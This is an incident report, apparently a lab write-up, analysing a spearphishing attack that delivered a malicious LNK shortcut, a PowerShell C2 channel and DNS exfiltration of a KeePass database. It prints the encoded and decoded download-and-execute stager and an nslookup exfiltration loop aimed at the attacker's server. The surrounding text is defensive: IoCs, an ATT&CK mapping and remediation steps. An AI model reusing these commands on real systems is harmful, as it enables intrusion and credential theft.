# Incident Report: The Boogeyman 1 – Spearphishing, PowerShell C2 & DNS Exfiltration

| Metadata | Details |
| :--- | :--- |
| **Date** | October 2026 |
| **Analyst** | Piotr Asyngier |
| **Tools Used** | Thunderbird, `lnkparse`, `jq`, `grep`, CyberChef, Wireshark |
| **Category** | Phishing Analysis, Endpoint Triage & Network Forensics |
| **Threat Actor / Group** | Boogeyman |
| **Affected Victim** | Julianne Westcott (`j.westcott` / IP: `10.10.182.255`), Finance Dept – Quick Logistics LLC |

---

## 1. Executive Summary
Julianne Westcott, a finance employee at **Quick Logistics LLC**, received a targeted spearphishing email spoofing a business partner (*B Packaging Inc.*) regarding an overdue invoice. Executing the password-protected attachment triggered a multi-stage infection chain attributed to the **Boogeyman** threat group.

Through correlation of email artifacts, PowerShell ScriptBlock logs (`powershell.json`), and packet captures (`capture.pcapng`), the investigation confirmed that the attacker established an HTTP Command and Control (C2) channel, performed host reconnaissance using **Seatbelt**, harvested local notes from the **Microsoft Sticky Notes** SQLite database (`plum.sqlite`), and exfiltrated a sensitive KeePass password database (`protected_data.kdbx`) over **DNS** to an external server (`167.71.211.113`).

---

## 2. Phishing Email & Initial Access Analysis

### 2.1. Email Headers & Spoofed Infrastructure
Inspection of the raw `.eml` message source in **Thunderbird** (`Ctrl + U`) revealed a typosquatted domain (`bpakcaging[.]xyz` instead of `bpackaging`) designed to deceive the finance team:
* **Sender (`From` / `Reply-To`):** `Arthur Griffin <agriffin@bpakcaging[.]xyz>`
* **Recipient (`To`):** `Julianne Westcott <julianne.westcott@hotmail.com>`
* **Subject:** `Collection for Quick Logistics LLC-Jan 2023`
* **Timestamp:** `Fri, 13 Jan 2023 09:25:26 +0000`
* **Third-Party Mail Relay Service:** Analysis of the `DKIM-Signature` (`d=elasticemail.com`) and `List-Unsubscribe` headers confirmed the attacker abused **Elastic Email** to relay the phishing message and bypass basic spam filters.

<img width="689" height="112" alt="obraz" src="https://github.com/user-attachments/assets/bcd50605-44c1-4236-a1f5-211727109ff9" />


<img width="924" height="198" alt="obraz" src="https://github.com/user-attachments/assets/cb5335ea-c81e-4161-a083-50e50b1204cb" />


---

### 2.2. Malicious Attachment & LNK Payload Analysis
To evade automated email gateway scanning, the attacker attached an encrypted archive (`Invoice.zip`) and provided the decryption password directly inside the email body (`Invoice2023!`).

* **Extracted Artifact:** Unpacking `Invoice.zip` revealed a malicious Windows Shortcut file: **`Invoice_20230103.lnk`**.
* **Static LNK Analysis (`lnkparse`):** Running `lnkparse Invoice_20230103.lnk` exposed a classic masquerading technique—while the shortcut icon pointed to `C:\Users\Administrator\Desktop\excel.ico`, the target binary was `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`.
* **Extracted Command Line Arguments:**
  ```powershell
  -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
  ```
* **Decoded Stage-1 Payload (UTF-16LE Base64):**
  ```powershell
  iex (new-object net.webclient).downloadstring('hxxp://files.bpakcaging[.]xyz/update')
  ```

<img width="477" height="407" alt="obraz" src="https://github.com/user-attachments/assets/2fba7721-c7d5-4575-bdad-89053257c597" />


<img width="476" height="185" alt="obraz" src="https://github.com/user-attachments/assets/e0801a21-34cb-42a5-80c7-2eb088466786" />


<img width="943" height="541" alt="obraz" src="https://github.com/user-attachments/assets/59907488-02dd-40db-847e-2559f5608fe0" />


---

## 3. Endpoint Triage – PowerShell Log Analysis (`powershell.json`)

Using `jq` and `grep`, the extracted PowerShell ScriptBlock logs (`powershell.json`) were parsed to reconstruct the post-exploitation timeline on Julianne's workstation (`C:\Users\j.westcott\`).

### 3.1. C2 Channel & Payload Staging Domains
Filtering ScriptBlock telemetry for HTTP indicators exposed the attacker's staging and C2 infrastructure:
* **Command Used:**
  ```bash
  cat powershell.json | jq '.ScriptBlockText' | grep -i http
  ```
* **Identified Infrastructure:**
  1. **`files.bpakcaging[.]xyz`** – File staging server used to host the initial `/update` script as well as secondary binaries (`sb.exe`, `sq3.exe`).
  2. **`cdn.bpakcaging[.]xyz` (Port `8080`)** – Command and Control (C2) server polled inside a persistent `while ($true)` loop via `Invoke-WebRequest` with custom HTTP headers (`X-3862-8f49`).

<img width="944" height="215" alt="obraz" src="https://github.com/user-attachments/assets/6de66916-67ab-4dba-b099-d777a11e910d" />


---

### 3.2. Host Reconnaissance & Credential Harvesting (Sticky Notes)
Further inspection of downloaded scripts and executed binaries revealed how the attacker located sensitive files on the endpoint:

1. **Automated Host Enumeration (`Seatbelt`):**
   * **Command Used:** `cat powershell.json | jq '.ScriptBlockText' | grep -i download`
   * **Finding:** The attacker executed **`Invoke-Seatbelt.ps1`** (**Seatbelt** from the `PowerSharpPack` repository) directly in memory to enumerate system configurations and user artifacts.
2. **Dumping Microsoft Sticky Notes (`sq3.exe`):**
   * **Command Used:** `cat powershell.json | jq '.ScriptBlockText' | grep -i sq3.exe`
   * **Finding:** The attacker downloaded a standalone SQLite3 binary (`sq3.exe`) and queried the local **Microsoft Sticky Notes** database (`SELECT * FROM Note LIMIT 100`):
     ```text
     C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
     ```

<img width="944" height="84" alt="obraz" src="https://github.com/user-attachments/assets/d2e821bb-95b4-44ec-9aff-63447550ed75" />


<img width="944" height="84" alt="obraz" src="https://github.com/user-attachments/assets/5f67c58b-8f17-4abb-b16d-a5669abe6dde" />

---

### 3.3. Data Exfiltration via DNS Tunneling (`nslookup`)
After inspecting the Sticky Notes database, the attacker navigated to the user's `Documents` directory and targeted a KeePass password database:
* **Exfiltrated File:** `C:\Users\j.westcott\Documents\protected_data.kdbx` (`protected_data.kdbx`)
* **Exfiltration Mechanism:** Filtering logs for user paths and hex encoding (`grep -i j.westcott` and `grep -i hex`) revealed a custom PowerShell DNS exfiltration routine:
  1. The file `protected_data.kdbx` was read into a byte array (`[System.IO.File]::ReadAllBytes($file)`) and converted into a hexadecimal string (`ToString("X2")`).
  2. The hex data was split into chunks and appended as subdomains to `.bpakcaging.xyz`.
  3. Using **`nslookup`**, each chunk was sent as a DNS `A` record query directly to the attacker's server at **`167.71.211[.]113`**:
     ```powershell
     ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination }
     ```

<img width="943" height="98" alt="obraz" src="https://github.com/user-attachments/assets/ffe4e782-765c-4824-bb13-672aa43e2ab7" />


<img width="942" height="82" alt="obraz" src="https://github.com/user-attachments/assets/0a663193-c1f6-415e-a7a4-5f5b7a774600" />


---

## 4. Network Traffic Analysis (`capture.pcapng`)

To corroborate the endpoint logs and fingerprint the attacker's server (`167.71.211.113`), the network packet capture (`capture.pcapng`) was analyzed in **Wireshark**.

* **Wireshark Display Filter:**
  ```text
  ip.src == 167.71.211.113 && http.response
  ```
* **Attacker Payload Server Fingerprinting:** Inspection of HTTP `200 OK` response headers (e.g., Frame `33256` delivering `/update` to `10.10.182.255`) identified the web server software hosting the payloads:
  * **`Server: SimpleHTTP/0.6 Python/3.10.7`** (**Python** `http.server` module).
* **Exfiltration Protocol Verification:** Network telemetry confirmed high-volume outbound **DNS** queries carrying hex-encoded chunks of `protected_data.kdbx` to `167.71.211.113`.

<img width="945" height="937" alt="obraz" src="https://github.com/user-attachments/assets/7f59f0a7-f3e9-4d5d-9cad-42e494bb07f6" />

---

## 5. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value (Defanged) | Context |
| :--- | :--- | :--- |
| **Email Address** | `agriffin@bpakcaging[.]xyz` | Spoofed sender address used in spearphishing |
| **Domain** | `bpakcaging[.]xyz` | Primary typosquatted attacker domain & DNS exfiltration zone |
| **Domain** | `files.bpakcaging[.]xyz` | Payload staging server (`Python/3.10.7 SimpleHTTP/0.6`) |
| **Domain / Port** | `cdn.bpakcaging[.]xyz:8080` | PowerShell HTTP C2 server |
| **IPv4 Address** | `167.71.211[.]113` | Attacker C2, payload server, and rogue DNS resolver |
| **File Artifact** | `Invoice.zip` / `Invoice_20230103.lnk` | Encrypted phishing archive & malicious LNK dropper |
| **File Artifact** | `sb.exe`, `sq3.exe`, `Invoke-Seatbelt.ps1` | Post-exploitation enumeration and SQLite dumping tools |
| **Exfiltrated Data** | `plum.sqlite` / `protected_data.kdbx` | Accessed Sticky Notes DB and exfiltrated KeePass database |

---

## 6. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques
* **`T1566.001` – Phishing: Spearphishing Attachment:** Delivery of password-protected `Invoice.zip` containing a malicious `.lnk` shortcut (`T1204.002`).
* **`T1059.001` – Command and Scripting Interpreter: PowerShell:** Base64-encoded stager and interactive C2 polling loop executed via `powershell.exe`.
* **`T1071.001` – Application Layer Protocol: Web Protocols:** Custom HTTP C2 communication over port `8080` using custom headers.
* **`T1555` – Credentials from Password Stores:** Querying Microsoft Sticky Notes (`plum.sqlite`) via `sq3.exe` and targeting KeePass (`protected_data.kdbx`).
* **`T1048.003` – Exfiltration Over Alternative Protocol:** Hex-encoded data exfiltration over **DNS** using `nslookup` directed at an external IP.

### Recommended Remediation Actions
1. **Immediate Containment:** Isolate workstation `10.10.182.255` (`j.westcott`) from the corporate network and terminate all active `powershell.exe` processes.
2. **Credential Rotation:** Assume full compromise of all credentials stored inside `protected_data.kdbx` and `plum.sqlite`. Immediately rotate passwords and revoke active sessions for all affected accounts.
3. **Network & Email Controls:** Block `167.71.211.113` and `*.bpakcaging.xyz` at the perimeter firewall/DNS proxy. Enforce firewall rules restricting outbound DNS (`UDP/TCP 53`) strictly to internal corporate DNS resolvers to prevent direct external `nslookup` exfiltration.Quarantine all emails from `bpakcaging.xyz` across the finance department.
